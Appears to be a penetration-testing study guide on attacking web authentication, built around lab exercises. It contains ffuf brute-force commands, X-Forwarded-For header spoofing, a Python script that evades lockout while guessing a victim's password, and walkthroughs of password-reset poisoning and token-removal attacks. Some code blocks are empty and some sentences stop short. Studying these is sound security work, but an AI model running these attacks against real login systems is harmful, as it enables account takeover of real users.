




# 1. Vulnerabilities in password-based login

## 1.1 - Username enumeration and brute-forcing

User enumeration is a common vulnerability that can `expose valid usernames` through `subtle differences` in application behavior—such as `error messages` or `response timing`.

When brute-forcing a login page, watch for differences in:

- **Status codes:** A different HTTP status code from the norm likely indicates a valid username.
- **Error messages:** Distinct messages for "wrong username + password" vs. "wrong password only" can reveal valid usernames — even a single hidden character difference matters.
- **Response times:** Deviations from typical response times may signal a valid username (e.g., password validation only triggers after a valid username is found). Using an excessively long password can amplify this delay.

---

### Brute-forcing no brainer

```
ffuf -w xato-net-10-million-usernames.txt:FUZZ -u http://TARGET-IP/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user" -v -c
```

- Blindly brute-forcing with `username lists` from `Seclist` does not get you to anywhere. You need to craft your own custom list from different sources like: `exposed DB`, `social media`, ...
- Usernames are easy to guess when they follow predictable patterns like `firstname.lastname@company.com` or common defaults like `admin` and `administrator`.
- During audits, check if usernames are exposed publicly—e.g., through accessible `user profiles` or in `HTTP response`s that may reveal `email addresses` of privileged users like `admins` or `IT support`.

In some case, the different is **very subtle**, could be just a `dot`. You need to filter regex as close as possible. If you're using `ffuf`, note that some special char need `escaping` in regex filter:

## 1.2 - Password Brute-forcing

Brute-forcing passwords is a common attack method that exploits weak or reused credentials, which are still widely used despite known risks.

If we some how got a `valid username`, the no-brainer way (and near impossible chance of success) is to brute-force login with `Seclist`:
```
default-cred (worth trying)
top-most-common-password (worth trying)
rockyou (not likely, unless filter for policies)
```

For example, if we somehow can get the password policy from Information Disclosure, or somthing like error message when logging in:

```
Password policy:
- contains at least 1 upper-case char
- contains at least 1 lower-case char
- contains at least 1 digit
- minimum length of 10 chars
```

We can try to cut those out of custom wordlist:
```
$ grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
$ wc -l custom_wordlist.txt

151647 custom_wordlist.txt
```

**Password Policy Filtering:**

| Policy Requirement | Grep Regex Pattern | Explanation |
|--------------------|-------------------|-------------|
| **Minimum Length** (e.g., 8 characters) | `grep -E '^.{8,}$' wordlist.txt` | `^` matches the start of the line, `.` matches any character, `{8,}` matches 8 or more occurrences, `$` matches the end of the line |
| **At Least One Uppercase Letter** | `grep -E '[A-Z]' wordlist.txt` | `[A-Z]` matches any uppercase letter |
| **At Least One Lowercase Letter** | `grep -E '[a-z]' wordlist.txt` | `[a-z]` matches any lowercase letter |
| **At Least One Digit** | `grep -E '[0-9]' wordlist.txt` | `[0-9]` matches any digit |
| **At Least One Special Character** | `grep -E '[!@#$%^&*()_+-=[]{};'"'"':"\,.<>/?]' wordlist.txt` | `[!@#$%^&*()_+-=[]{};':"\,.<>/?]` matches any special character (symbol) |
| **No Consecutive Repeated Characters** | `grep -E '(.)\1' wordlist.txt` | `(.)` captures any character, `\1` matches the previously captured character. This pattern will match any line with consecutive repeated characters. Use `grep -v` to invert the match |
| **Exclude Common Patterns** (e.g., "password") | `grep -v -i 'password' wordlist.txt` | `-v` inverts the match, `-i` makes the search case-insensitive. This pattern will exclude any line containing "password" (or "Password", "PASSWORD", etc.) |
| **Exclude Dictionary Words** | `grep -v -f dictionary.txt wordlist.txt` | `-f` reads patterns from a file. dictionary.txt should contain a list of common dictionary words, one per line |
| **Combination of Requirements** | `grep -E '^.{8,}$' wordlist.txt \| grep -E '[A-Z]'` | This command filters a wordlist to meet multiple password policy requirements. It first ensures that each word has a minimum length of 8 characters, and then pipes the result into a second grep command to match only words that contain at least one uppercase letter |

### Creating custom password list with CUPP tool

CUPP (Common User Passwords Profiler) creates personalized password wordlists using gathered intelligence about targets. After generating usernames with Username Anarchy, CUPP complements this with targeted password lists.

CUPP's effectiveness depends on the quality of information provided. Intelligence sources include:
* **Social Media**: Birthdays, pet names, interests, relationships (Facebook, Twitter, Instagram, LinkedIn)
* **Company Websites**: Professional details and bios
* **Public Records**: Address, family members, property ownership
* **News Articles/Blogs**: Interests, achievements, affiliations

For example, using Jane Smith's profile:

- Partner: Jim (Jimbo), born December 12, 1990
- Pet: Spot
- Company: AHI
- Interests: Hackers, Pizza, Golf, Horses
- Favorite Color: Blue

CUPP generates comprehensive password variations:

* Reversed: `enaj`, `enaJ`
* Birthdate variations: `jane1994`, `smith2708`
* Concatenations: `janesmith`, `smithjane`

* Numbers: `jane123`, `smith2024`
* Leetspeak: `j4n3`, `5m1th`
* Combined mutations: `Jane1994!`, `smith2708@`

This personalized approach significantly increases password-cracking success rates compared to generic dictionaries.

Invoke CUPP in interactive mode, CUPP will guide you through a series of questions about your target, enter the following as prompted:

```

```

We now have a generated username.txt list and jane.txt password list, but there is one more thing we need to deal with. CUPP has generated many possible passwords for us, but Jane's company, AHI, has a rather odd password policy:
- Minimum Length: 6 characters
- Must Include:
    + At least one uppercase letter
    + At least one lowercase letter
    + At least one number
    + At least two special characters (from the set `!@#$%^&*`)

As we did earlier, we can use grep to filter that password list to match that policy:

`$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt`

This command efficiently filters jane.txt to match the provided policy, from ~46000 passwords to a possible ~7900. It first ensures a minimum length of 6 characters, then checks for at least one uppercase letter, one lowercase letter, one number, and finally, at least two special characters from the specified set. The filtered results are stored in jane-filtered.txt.

### Password re-use

While password policies enforce complexity (minimum length, mixed case, special characters), users often adapt memorable passwords to meet requirements rather than creating truly random ones. For example, `mypassword` becomes `Mypassword1!` or `Myp4$w0rd`.

When regular password changes are required, users typically make predictable modifications like `Mypassword1!` → `Mypassword1?` or `Mypassword2!`. Understanding these human behavior patterns makes brute-force attacks far more effective than randomly trying all character combinations.

## 1.3 - Flawed brute-force protection

Brute-force protection typically works by `locking accounts` or `blocking IPs` after too many failed login attempts. 

However, these defenses can be flawed — for example, if the failed-attempt counter `resets` on a `successful login`, an attacker can bypass IP blocking simply by logging into their own account periodically throughout the attack, rendering the protection ineffective.

---

### Bypass with request Header

If your `IP` would be `blocked` on **too many invalid login attempts**, verify if `X-Forwarded-For` header is supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection.

```
POST TARGET-WEB/login HTTP/1.1
host: ...
...
X-Forwarded-For: 1
```

By adding `X-Forwarded-For: 1` in the request and increasing the number on every attempt, we could potentially spoof your IP address. If it success, automate bt fuzzing with `pitchfork` attack mode.

```
ffuf -w username:FUZZ1 -w numbers2.txt:FUZZ2 -u 'TARGET-WEBSITE' -H 'X-Forwarded-For: FUZZ2' -X POST -d 'username=FUZZ1&password=invalidpassword' -c -ft '<1000' -mode pitchfork
```

```
ffuf -w password:FUZZ1 -w numbers2.txt:FUZZ2 -u "TARGET-WEBSITE" -X POST -d 'username=adserver&password=FUZZ1' -H 'X-Forwarded-For: FUZZ2' -c -mc 301,302 -mode pitchfork
```

---

### Bypass with valid cred

In this case, your IP is temporarily blocked if you submit 3 incorrect logins in a row. However, notice that you can reset the counter for the number of failed login attempts by logging in to your own account before this limit is reached.

**Bypass script:**
```python
import requests

URL = "https://0a0b009c03589084814020ab008700b9.web-security-academy.net/login"
PASSWORDS = open("/home/kali/HTB/Boxes/password").read().splitlines()

carlos_attempts = 0

for i, password in enumerate(PASSWORDS):
    if i % 2 == 0 and i != 0:
        requests.post(URL, data={"username": "wiener", "password": "peter"})

    r = requests.post(URL, data={"username": "carlos", "password": password}, allow_redirects=False)
    carlos_attempts += 1
    print(f"[{carlos_attempts}] Trying: {password}")

    if r.status_code == 302:
        print(f"\n[+] Found after {carlos_attempts} attempts: carlos:{password}")
        break
```

## 1.4 - Account locking

Websites often lock accounts after a set number of failed login attempts to prevent brute-forcing. However, lockout responses can inadvertently help attackers enumerate valid usernames. 

While account locking offers some protection against targeted attacks on a specific account, it fails to prevent broader brute-force attacks where the attacker simply needs access to *any* account.

This protection can be bypassed by:

1. Enumerating a list of likely valid usernames.
2. Selecting a small password shortlist that doesn't exceed the allowed login attempts (e.g. 3 passwords if the limit is 3).
3. Using a tool like Burp Intruder to try each password against every username — brute-forcing accounts without triggering lockout. Compromising just one user is enough.

Account locking also fails against **credential stuffing** — using stolen `username:password` pairs from data breaches. Since attackers only attempt each username once, lockout is never triggered. This is especially dangerous as a single automated attack can compromise many accounts, exploiting the common habit of reusing credentials across multiple sites.

## 1.5 - User Rate Limiting

Sites block IPs that send too many login requests in a short time. Unblocking typically requires waiting, admin action, or passing a CAPTCHA.

This method is preferred over account lockout as it's less vulnerable to username enumeration and DoS attacks — but it's not foolproof. Attackers can spoof their IP to bypass the block, or potentially guess multiple passwords in a single request.

## 1.6 - HTTP Basic Authentication

The client encodes the username and password in Base64 and sends it with every request via the `Authorization` header. 
```
Authorization: Basic base64(username:password)
```

Despite its simplicity, it's considered insecure for several reasons:

- **Repeated credential exposure** — credentials are sent with every request, making them vulnerable to man-in-the-middle attacks without HSTS.
- **Brute-force risk** — the static token typically lacks brute-force protection.
- **No CSRF protection** — it's inherently vulnerable to session-related exploits.

Even if a compromised page seems unimportant, exposed credentials are often reused elsewhere, expanding the attack surface.

# 2. Vulnerabilities in multi-factor authentication

Multi-factor authentication (MFA) can contain exploitable vulnerabilities. While most sites use single-factor (password-only) authentication, many now require 2FA — typically a password plus a temporary code from a physical device.

2FA is more secure because obtaining two separate factors simultaneously is much harder for attackers. However, poor implementation can still be beaten or bypassed entirely.

It's also worth noting that true MFA requires verifying *different* factors. Email-based 2FA, for example, doesn't qualify — both the password and the code rely on the same knowledge factor (email credentials), so it's really just verifying one factor twice.

---

**Two-factor authentication tokens**

Verification codes can be delivered in several ways. Dedicated hardware devices (e.g. RSA tokens) or mobile apps like Google Authenticator are more secure, as they generate codes directly on the device.

SMS-based codes are weaker — the code is transmitted rather than generated locally, making it vulnerable to interception or SIM swapping, where an attacker hijacks the victim's phone number to receive their messages.

---

### Bypassing 2FA by Skipping the Verification Step

Flawed 2FA implementations can sometimes be bypassed entirely due to how partial authentication states are handled. When a login flow is split across two pages — password first, then a verification code — the user may already be placed in a "logged in" state before completing the second step. This makes it worth testing whether you can skip directly to authenticated pages after only completing the first step, as some applications fail to verify that the second step was actually completed. For example, if a web application redirects users to `/admin.php` after successful authentication, and relies solely on the login page to gate access, navigating directly to `/admin.php` may expose protected content without ever entering a verification code.

A subtle but related variant of this vulnerability arises from improper server-side enforcement. Consider a PHP implementation that checks authentication like this:

```php
if(!$_SESSION['active']) {
    header("Location: index.php");
}
```

This redirects unauthenticated users to `/index.php`, but critically, **it does not halt script execution** — meaning the protected page content is still rendered and included in the response body. While a browser will follow the redirect and display the login prompt, an attacker can use an intercept tool to catch the response and change the status code from `302` to `200`, revealing the full admin page that was silently sent along.


---

### Bypassing 2FA verification logic

Sometimes flawed logic in two-factor authentication means that after a user has completed the initial login step, the website doesn't adequately verify that the same user is completing the second step.

For example, you log in with credentials in the first step as follows:
```
POST /login HTTP/2
Host: TARGET-WEB
Cookie: session=abcdef
Content-Type: application/x-www-form-urlencoded

username=wiener&password=peter
```

Then, the website response with redirection and a `GET` request is made like this:
```

Host: TARGET-WEBSITE

```

This request is used to generate 2FA code for `verify` value in the `cookie` header. Here, we can tamper it with another username:

# 3. Vulnerabilities in other authentication mechanisms

Beyond login, most sites offer account management features like password changes and resets — which can introduce their own vulnerabilities. Sites often secure their login pages carefully but neglect to apply the same rigor to related functionality. This is especially risky when attackers can create their own accounts and freely study these additional pages.

## 3.1 - Keeping users logged in

"Remember me" functionality typically uses a persistent cookie to bypass login. If this cookie is predictable — generated from static values like username, timestamp, or password — it becomes a target. Attackers with their own account can study their cookie, deduce the formula, and brute-force other users' cookies, potentially bypassing login attempt limits.

Encryption doesn't always help. Base64 offers no real protection, and even proper hashing is vulnerable if no salt is used — attackers can simply hash wordlists to crack it. Without an account, attackers can still steal cookies via XSS or consult public documentation if the site uses an open-source framework.

For example, a website's `stay-logged-in` cookie is made up of `base64(username+':'+md5HashOfPassword)`. Once knowing this, we can make cookies from password list as follow:

## 3.2 - Resetting user passwords

Since users inevitably forget passwords, websites must offer a reset mechanism. Because normal authentication isn't possible in this scenario, the process is inherently risky and must be implemented carefully.

**Sending passwords by email** - Some sites generate and email a new password. This is problematic — sending credentials over insecure channels risks man-in-the-middle attacks, and email inboxes aren't designed for secure storage. Any such password should expire immediately or be changed right away.

**Resetting via URL** - A more robust approach sends the user a unique reset URL. Weak implementations use guessable parameters (e.g. `?user=victim-user`), letting attackers swap in any username.

A stronger approach uses a high-entropy, user-agnostic token:
`/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8`

The backend should verify the token, map it to the correct user, then expire and destroy it immediately after use. A common flaw is failing to re-validate the token on form submission — allowing an attacker to delete their own token and reset any user's password.

---

For example, an **Password reset broken logic** would look like this:

The attacker requests a password reset for their own account (wiener) and observes the full HTTP flow in Burp Suite.
```
GET /forgot-password?temp-forgot-password-token=abc123
```

The resulting POST request looks like:
```
POST /forgot-password?temp-forgot-password-token=abc123
...

temp-forgot-password-token=abc123&username=wiener&new-password=hacked123
```

**The broken logic** is shown where the attacker **delete token** from both the URL and body and replays the request, and the server **accepts** this and **changes** the password — confirming the token is never checked:
```
POST /forgot-password?temp-forgot-password-token=
...

temp-forgot-password-token=&username=wiener&new-password=hacked123
```

From here, the attacker can changes only the username field to the victim's:
```
POST /forgot-password?temp-forgot-password-token=
...

temp-forgot-password-token=&username=carlos&new-password=hacked123
```

> **Root cause**: The server uses the `username` from the **request body** to determine which password to change, rather than deriving the account identity from the **validated token**. The token is checked for presence on the reset form page, but never re-validated on form submission.

---

If the URL in the reset email is generated dynamically, this may also be vulnerable to password reset poisoning.

Many web applications generate password reset links dynamically, building the URL from the incoming HTTP request's host information. When a reverse proxy or load balancer is in the chain, headers like `X-Forwarded-Host` are used to pass the **original client-facing hostname** to the backend. If the application blindly trusts this header when constructing reset links, an attacker can redirect where the token is sent.

The flaw lies in how the application reads `X-Forwarded-Host` (or similar headers like `X-Forwarded-For`, `X-Host`) to build the password reset URL dynamically:
```
https://<X-Forwarded-Host>/forgot-password?temp-forgot-password-token=<token>
```

It never validates whether the host value is legitimate. This means whoever **triggers** the reset email can control **where the token is sent** — even though they don't control the victim's inbox. For example, The attacker triggers a reset for their own account and intercepts the POST request in Burp:
```
POST /forgot-password HTTP/1.1
Host: vulnerable-website.com
...

username=wiener
```

The victim receives an email with:
```
https://vulnerable-website.com/forgot-password?temp-forgot-password-token=abc123
```

The attacker injects their own server in the header:
```
POST /forgot-password HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: attacker-exploit-server.net
...

username=wiener
```

The reset email now contains:
```
https://attacker-exploit-server.net/forgot-password?temp-forgot-password-token=abc123
```

The app trusted the injected header and poisoned the reset link. The attacker changes the username to the victim and sends the poisoned request:
```
POST /forgot-password HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: attacker-exploit-server.net
...

username=carlos
```

Carlos receives this email and — being careless — `clicks` the link:
```
https://attacker-exploit-server.net/forgot-password?temp-forgot-password-token=CARLOS_TOKEN
```

The attacker checks their exploit server's access log and sees:
```
GET /forgot-password?temp-forgot-password-token=CARLOS_TOKEN
```

## 3.3 - Changing user passwords

Password change pages use the same credential-checking logic as login pages, making them vulnerable to the same attacks. They become especially dangerous when accessible without being logged in — for instance, if the username is passed in a hidden field, an attacker could modify it to target any user, enabling username enumeration and brute-force attacks.

Password change forms typically require three inputs: the current password and two fields for the new password (new + confirm). The server validates both. The problem arises when the server's **error messages behave differently depending on which validation fails first** — leaking whether the current password was correct or not, and doing so without any rate limiting.

For example, an application has two separate validation checks with distinct error responses:

| Condition | Server Response |
|---|---|
| Wrong current password + matching new passwords | Account gets **locked** |
| Wrong current password + **non-matching** new passwords | `"Current password is incorrect"` |
| ✅ Correct current password + non-matching new passwords | `"New passwords do not match"` |

The third case is the oracle. By always submitting two **different** new passwords, the attacker prevents lockout and gets a clean signal when the correct password is found — all without ever actually changing the password.


The attacker logs in as `wiener` and uses the password change feature, intercepting the POST in Burp:

```http
POST /my-account/change-password HTTP/1.1
...

username=wiener&current-password=peter&new-password-1=abc&new-password-2=xyz
```

Key observation: `username` is a **hidden field** — attacker-controllable.

The attacker tests different input combinations and documents the responses:

```
current-password=WRONG  + new1=abc + new2=abc  → Account locked ❌ (avoid this)
current-password=WRONG  + new1=abc + new2=xyz  → "Current password is incorrect"
current-password=RIGHT  + new1=abc + new2=xyz  → "New passwords do not match" ✅ (oracle hit)
```

By always keeping `new-password-1 ≠ new-password-2`, the attacker:
- **Avoids account lockout** entirely
- Gets a **binary signal** distinguishing wrong vs. correct current password


The attacker modifies the request to target Carlos and marks the `current-password` field as the injection point:

```http
POST /my-account/change-password HTTP/1.1
...

username=carlos&current-password=FUZZ&new-password-1=abc&new-password-2=xyz
```
